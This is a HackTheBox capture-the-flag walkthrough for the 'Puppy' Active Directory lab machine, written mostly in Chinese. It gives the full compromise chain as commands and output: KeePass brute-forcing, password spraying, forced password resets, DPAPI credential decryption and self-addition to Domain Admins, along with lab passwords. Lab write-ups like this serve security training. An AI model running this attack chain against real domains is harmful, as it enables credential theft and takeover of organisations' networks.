---
title: 'HackTheBox: Puppy [Active Directory]'
disqus: hackmd
---

HackTheBox: Puppy [Active Directory]
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/Puppy

### Initial Enumeration

● Start Machine: `10.10.11.70`\
![image](https://hackmd.io/_uploads/rJD_tIk9ex.png)
> account: `levi.james`:`KingofAkron2025!`

```
┌──(chw㉿CHW)-[~/Desktop]
└─$ nmap -sC -sV -Pn 10.10.11.70    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 12:46 EDT
Nmap scan report for 10.10.11.70
Host is up (0.20s latency).
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-29 23:47:17Z)
111/tcp  open  rpcbind?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  mountd        1-3 (RPC #100005)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-29T23:49:13
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.36 seconds

```
> DNS, SMB, Ldap, kpasswd5, Http, RPC\
> Doman: `puppy.htb`

編輯 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts                           
10.10.11.70     puppy.htb
...
```

## Solution

### 1. Recon
#### 1.1 RPC
使用已知帳號密碼登入 RPC
- 所有使用者
```
┌──(chw㉿CHW)-[~/Desktop]
└─$ rpcclient -U 'levi.james%KingofAkron2025!' 10.10.11.70 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[levi.james] rid:[0x44f]
user:[ant.edwards] rid:[0x450]
user:[adam.silver] rid:[0x451]
user:[jamie.williams] rid:[0x452]
user:[steph.cooper] rid:[0x453]
user:[steph.cooper_adm] rid:[0x457]
```
> 建立 user.txt\
> ![image](https://hackmd.io/_uploads/B1AvGvJ9xg.png)

user 結果與 ldapsearch 搜尋結果一樣\
`ldapsearch -x -H ldap://PUPPY.HTB -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(objectClass=user)" sAMAccountName`

- 所有 Group
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[HR] rid:[0x454]
group:[SENIOR DEVS] rid:[0x455]
group:[DEVELOPERS] rid:[0x459]
```
- 列出共享資料夾
```
rpcclient $> netshareenum
result was WERR_ACCESS_DENIED
```
#### 1.2 Enum4linux
使用 Enum4linux 透過 SMB 自動化枚舉
```
┌──(chw💲CHW)-[~]
└─$ enum4linux -a -u 'levi.james' -p 'KingofAkron2025!' 10.10.11.70

...
 ==================================( Share Enumeration on 10.10.11.70 )==================================
                                                                                                                                                    
do_connect: Connection to 10.10.11.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                              

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      DEV-SHARE for PUPPY-DEVS
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

...
 =======================================( Groups on 10.10.11.70 )=======================================

...
[+]  Getting builtin group memberships:                                                                     
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE                                                                                       
...
Group: Remote Management Users' (RID: 580) has member: PUPPY\adam.silver
Group: Remote Management Users' (RID: 580) has member: PUPPY\steph.cooper
Group: Administrators' (RID: 544) has member: PUPPY\Administrator
Group: Administrators' (RID: 544) has member: PUPPY\Enterprise Admins
Group: Administrators' (RID: 544) has member: PUPPY\Domain Admins
Group: Administrators' (RID: 544) has member: PUPPY\steph.cooper_adm
...
[+]  Getting domain group memberships:                                   
Group: 'Domain Admins' (RID: 512) has member: PUPPY\Administrator                                                                                   
Group: 'Group Policy Creator Owners' (RID: 520) has member: PUPPY\Administrator
Group: 'Enterprise Admins' (RID: 519) has member: PUPPY\Administrator
Group: 'HR' (RID: 1108) has member: PUPPY\levi.james
Group: 'DEVELOPERS' (RID: 1113) has member: PUPPY\ant.edwards
Group: 'DEVELOPERS' (RID: 1113) has member: PUPPY\adam.silver
Group: 'DEVELOPERS' (RID: 1113) has member: PUPPY\jamie.williams
Group: 'Domain Controllers' (RID: 516) has member: PUPPY\DC$
Group: 'SENIOR DEVS' (RID: 1109) has member: PUPPY\ant.edwards
Group: 'Schema Admins' (RID: 518) has member: PUPPY\Administrator
...
```
> Group`Domain Admins`:`Administrator`
> Group`Administrators`: `steph.cooper_adm`

#### 1.3 Smbmap
Smbmap 查看 share folder 權限
```
┌──(chw💲CHW)-[~]
└─$ smbmap -H 10.10.11.70 -u levi.james -p 'KingofAkron2025!'    

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.70:445 Name: puppy.htb                 Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```
> 有個 DEV 但 NO ACCESS

### 2. Edit LDAP
透過 LDIF (.ldif) 修改 LDAP 物件\
將 levi.james 加入 DEVELOPERS 群組
```
┌──(chw㉿CHW)-[~/Puppy]
└─$ cat add_group.ldif
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB

┌──(chw㉿CHW)-[~/Puppy]
└─$ ldapmodify -x -H ldap://10.10.11.70 \
  -D 'PUPPY\levi.james' -w 'KingofAkron2025!' -f add_group.ldif

modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"

```
利用 smbclient 查看
```
┌──(chw㉿CHW)-[~/Puppy]
└─$ smbclient  //10.10.11.70/DEV -U levi.james                                                         
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

                5080575 blocks of size 4096. 1599392 blocks available
smb: \> get KeePassXC-2.7.9-Win64.msi         
smb: \> get recovery.kdbx
smb: \> cd Projects\
smb: \Projects\> ls
  .                                   D        0  Sat Mar  8 11:53:36 2025
  ..                                 DR        0  Sun Mar 23 03:07:57 2025

                5080575 blocks of size 4096. 1599498 blocks available

```
> 成功看到 DEV folder\
> 下載分析


### 3. keepass2john / keepass4brute
利用 keepass2john 破解
```
┌──(chw㉿CHW)-[~/Puppy]
└─$ keepass2john recovery.kdbx 
! recovery.kdbx : File version '40000' is currently not supported!
```
> `.kdbx` 是 KeePass v4.0+ (KDBX4 格式)，keepass2john 版本不支援

上網找資料後，可以使用 [keepass4brute](https://github.com/r3nt0n/keepass4brute)
```
┌──(chw💲CHW)-[~/Tools/keepass4brute]
└─$ sudo apt update
sudo apt install keepassxc-cli
┌──(chw💲CHW)-[~/Tools/keepass4brute]
└─$ ./keepass4brute.sh ../../Puppy/recovery.kdbx /usr/share/wordlists/rockyou.txt                 
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 98 - Estimated time remaining: 14 weeks, 3 days
[+] Current attempt: liverpool

[*] Password found: liverpool

```
或 `sudo apt install keepassxc`

> 成功爆出 `recovery.kdbx`密碼：`liverpool`

打開資料庫
```
┌──(chw💲CHW)-[~/Puppy]
└─$ keepassxc-cli open recovery.kdbx 
Enter password to unlock recovery.kdbx: 
recovery> ls
JAMIE WILLIAMSON
ADAM SILVER
ANTONY C. EDWARDS
STEVE TUCKER
SAMUEL BLAKE
recovery>
```
分別查看每個 USER
```
recovery> show -s "JAMIE WILLIAMSON"
Title: JAMIE WILLIAMSON
UserName: 
Password: JamieLove2025!
URL: puppy.htb
Notes: 
Uuid: {5f112cf4-85ed-4d4d-bf0e-5e35da983367}
Tags:
recovery> show -s "ADAM SILVER"
Title: ADAM SILVER
UserName: 
Password: HJKL2025!
URL: puppy.htb
Notes: 
Uuid: {387b31a3-4a42-4352-ad9a-a42a70fa19f5}
Tags: 
recovery> show -s "ANTONY C. EDWARDS"
Title: ANTONY C. EDWARDS
UserName: 
Password: Antman2025!
URL: puppy.htb
Notes: 
Uuid: {bfd9590f-b0c6-41f8-b2f5-7e6c5defa5e2}
Tags: 
recovery> show -s "STEVE TUCKER"
Title: STEVE TUCKER
UserName: 
Password: Steve2025!
URL: puppy.htb
Notes: 
Uuid: {d51a238d-4fe4-4ede-bb83-e6bb6e48a0a1}
Tags: 
recovery> show -s "SAMUEL BLAKE"
Title: SAMUEL BLAKE
UserName: 
Password: ILY2025!
URL: puppy.htb
Notes: 
Uuid: {d17c1358-f48b-4865-8ab6-15484dccb69b}
Tags:
```
> 得到五組密碼 存成 pass.txt

利用 pass.txt 找對應的 user.txt

### 4. Find User/password
```
┌──(chw㉿CHW)-[~/Puppy]
└─$ netexec smb 10.10.11.70 -u user.txt -p pass.txt
...
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
```
> `ant.edwards`:`Antman2025!`

回去檢查 `ant.edwards` 的Group: `DEV`, `SENIOR DEVS`

### 5. Bloodhound
```
┌──(chw💲CHW)-[~/Puppy]
└─$ bloodhound-python -u 'ant.edwards' -p 'Antman2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 49S
INFO: Compressing output into 20250829161212_bloodhound.zip
```
BloodHound 分析
- 標記 User as Owned
![image](https://hackmd.io/_uploads/BJMxsFJqee.png)
- Find Shortest Paths to Domain Admins
![image](https://hackmd.io/_uploads/BylIitk9xx.png)
> 有 GenericAll `adam.silver`\ 
>❗️`adam.silver` 有 `Remote Management Users` 權限

### 6. rpcclient change passwod
用 rpcclient 修改 Adam Silver 的密碼
```
┌──(chw㉿CHW)-[~/Desktop]
└─$ rpcclient -U 'ant.edwards%Antman2025!' 10.10.11.70
rpcclient $> setuserinfo2 adam.silver 23 "chwchw"
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 adam.silver 23 "Chwchw41"
rpcclient $> setuserinfo2 adam.silver 24 "Chwchw41"
```
> 要符合 Password Policy\
> `adam.silver`:`Chwchw41`

也可以使用 
```
impacket-changepasswd 'PUPPY/adam.silver@dc.puppy.htb' \
  -newpass 'Chwchw41' \
  -altuser 'PUPPY/ant.edwards' -altpass 'Antman2025!' -reset \
  -dc-ip 10.10.11.70 
```

### 7. Evil-winrm
```
┌──(chw💲CHW)-[~/Puppy]
└─$ evil-winrm -i 10.10.11.70 -u 'adam.silver' -p 'Chwchw41'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

```
> `WinRM::WinRMAuthorizationError`: 代表密碼沒問題（若錯誤會報 Authentication Error）


後來透過\
`ldapsearch -x -H ldap://$IP -D "ant.edwards@puppy.htb" -w 'Antman2025!' -b "dc=puppy,dc=htb" "(sAMAccountName=adam.silver)" dn` \
才發現 `adam.silver` 帳號被禁用...🤯

>[!Note]
> `userAccountControl: 66050` 表示帳號被禁用

與前面一樣透過 LDIF (.ldif) 修改 LDAP 物件
```
┌──(chw💲CHW)-[~/Puppy]
└─$ cat silver_enable.ldif 
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 66048

┌──(chw💲CHW)-[~/Puppy]
└─$ ldapmodify -x -H ldap://10.10.11.70 \
  -D 'PUPPY\ant.edwards' -w 'Antman2025!' -f silver_enable.ldif

modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"

```
再次登入 Evil-winrm
```
┌──(chw💲CHW)-[~/Puppy]
└─$ evil-winrm -i 10.10.11.70 -u 'PUPPY\adam.silver' -p 'Chwchw41'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents>
```

### ✅ Get User Flag
> 在 `C:\Users\adam.silver\Desktop` 找到 User flag

## Privileges Escalation
在 `C:\Backups` 發現一個 zip
```
*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
Progress: 68% : |▓▓▓▓▓▒░░░░|  
Info: Download successful!
```
(Kali)
```
┌──(chw㉿CHW)-[~/Puppy]
└─$ unzip site-backup-2024-12-30.zip 
┌──(chw㉿CHW)-[~/Puppy]
└─$ cd puppy          
┌──(chw㉿CHW)-[~/Puppy/puppy]
└─$ cat nms-auth-config.xml.bak 
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>

```
> `steph.cooper`:`ChefSteph2025!`

### 6. Recon `steph.cooper`
Evil-winrm 登入 steph.cooper
```
┌──(chw㉿CHW)-[~/Desktop]
└─$ evil-winrm -i 10.10.11.70 -u 'PUPPY\steph.cooper' -p 'ChefSteph2025!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> ls


    Directory: C:\Users\steph.cooper\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/29/2025   6:37 PM        1355264 mimikatz.exe
-a----         8/29/2025   6:05 PM       10155520 winPEASxx64.exe

```
> 看到其他使用者上傳的工具 🫡

🧠：預計拿到 `steph.cooper_adm` 再打 DC
### 7. winPEAS
那就順便看一下 winPEAS
> 沒什麼特別

這裡卡了一段時間，MuMu 提示
>DPAPI 找過了嗎? [name=MuMu]

### 8. DPAPI
上網先找到 [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> .\SharpDPAPI.exe credentials /password:ChefSteph2025!

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.2


[*] Action: User DPAPI Credential Triage

[*] Will decrypt user masterkeys with password: ChefSteph2025!

[*] Found MasterKey : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
[*] Found MasterKey : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\82a1163f-e7e7-4a57-817c-266ce4d86227

[*] User master key cache:

{556a2412-1275-4ccf-b721-e6a0b4f90407}:4BE520BECFFF09F17E45269C9156768EE03609CE
{82a1163f-e7e7-4a57-817c-266ce4d86227}:29C1C63CABE46414CA3EBCDAE21D2364EF6D6167


[*] Triaging Credentials for current user


Folder       : C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {556a2412-1275-4ccf-b721-e6a0b4f90407}
    size             : 11068
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    [X] Decryption failed, likely incorrect password for the associated masterkey


Folder       : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\

  CredFile           : C8D69EBE9A43E9DEBF6B5FBD48B521B9

    guidMasterKey    : {556a2412-1275-4ccf-b721-e6a0b4f90407}
    size             : 414
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    [X] Decryption failed, likely incorrect password for the associated masterkey



SharpDPAPI completed in 00:00:00.4446158

```
> MasterKey 已經解出來了，但是 Credential blob 仍然無法解密\
> 似乎權限不足

直接到路徑下尋找
```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> Get-ChildItem -Force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

```
> Windows Credential Manager blob

```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> .\SharpDPAPI.exe credentials /password:ChefSteph2025! /target:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
 

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.2


[*] Action: User DPAPI Credential Triage

[*] Will decrypt user masterkeys with password: ChefSteph2025!

[*] Found MasterKey : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
[*] Found MasterKey : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\82a1163f-e7e7-4a57-817c-266ce4d86227

[*] User master key cache:

{556a2412-1275-4ccf-b721-e6a0b4f90407}:4BE520BECFFF09F17E45269C9156768EE03609CE
{82a1163f-e7e7-4a57-817c-266ce4d86227}:29C1C63CABE46414CA3EBCDAE21D2364EF6D6167


[*] Target Credential File: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9

  CredFile           : C8D69EBE9A43E9DEBF6B5FBD48B521B9

    guidMasterKey    : {556a2412-1275-4ccf-b721-e6a0b4f90407}
    size             : 414
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    [X] Decryption failed, likely incorrect password for the associated masterkey



SharpDPAPI completed in 00:00:00.4651856
```
> 系統保護 (CRYPTPROTECT_SYSTEM)

>[!important]
>離線爆破需要:
>1. User密碼 
>2. SID 解密用户的 DPAPI masterkey
>3. Windows Credential Manager blob 

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> Get-ChildItem -Force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         8/29/2025   7:05 PM            740 82a1163f-e7e7-4a57-817c-266ce4d86227
-a-hs-         8/29/2025   7:05 PM             24 Preferred




C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
```
隱藏檔無法直接下載
```
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" C:\Users\steph.cooper\Documents\556a2412_masterkey
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\82a1163f-e7e7-4a57-817c-266ce4d86227" C:\Users\steph.cooper\Documents\82a1163f_masterkey
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" C:\Users\steph.cooper\Documents\C8D69E_blob

attrib -s -h 556a2412_masterkey
attrib -s -h 82a1163f_masterkey
attrib -s -h C8D69E_blob

download 556a2412_masterkey
download 82a1163f_masterkey
download C8D69E_blob
```

(Kali 解密)
```
┌──(chw💲CHW)-[~/Puppy]
└─$ impacket-dpapi masterkey -file 556a2412_masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
                         
┌──(chw💲CHW)-[~/Puppy]
└─$ impacket-dpapi credential -f C8D69E_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 
Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description : 
Unknown     : 
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!

```
> `steph.cooper_adm`:`FivethChipOnItsWay2025!`

### 9. WriteDacl
拿下 `steph.cooper_adm` 後回去 Bloodhound 查看關係
![image](https://hackmd.io/_uploads/HJklg3Jqex.png)

有 WriteDacl 權限，直接修改 Domain Admins 群組的 ACL，把自己(`steph.cooper_adm`)加進去
```
┌──(chw💲CHW)-[~/Puppy]
└─$ dacledit.py -action write -rights FullControl \
  -principal PUPPY\\steph.cooper_adm \
  -target "CN=Domain Admins,CN=Users,DC=puppy,DC=htb" \
  -dc-ip 10.10.11.70 \
  PUPPY/steph.cooper_adm:'FivethChipOnItsWay2025!'

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[-] Target principal not found in LDAP (CN=Domain Admins,CN=Users,DC=puppy,DC=htb)
```
利用 Evil-winrm 登入 `steph.cooper_adm` 
```
┌──(chw💲CHW)-[~/Puppy]
└─$ evil-winrm -i 10.10.11.70 -u 'PUPPY\steph.cooper_adm' -p 'FivethChipOnItsWay2025!'

...
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> net group "Domain Admins" steph.cooper_adm /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents> net group "Domain Admins" /domain
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            steph.cooper_adm
The command completed successfully.

*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/29/2025  10:02 AM             34 root.txt
```

>[!Tip]
>也可以 dump Administrator Hash:
>`secretsdump.py 'PUPPY/steph.cooper_adm:FivethChipOnItsWay2025!@10.10.11.70'`

### ✅ Get Root FLAG
![image](https://hackmd.io/_uploads/SyhQ5ckcle.png)



###### tags: `HTB` `Web` `CTF` `CMS`
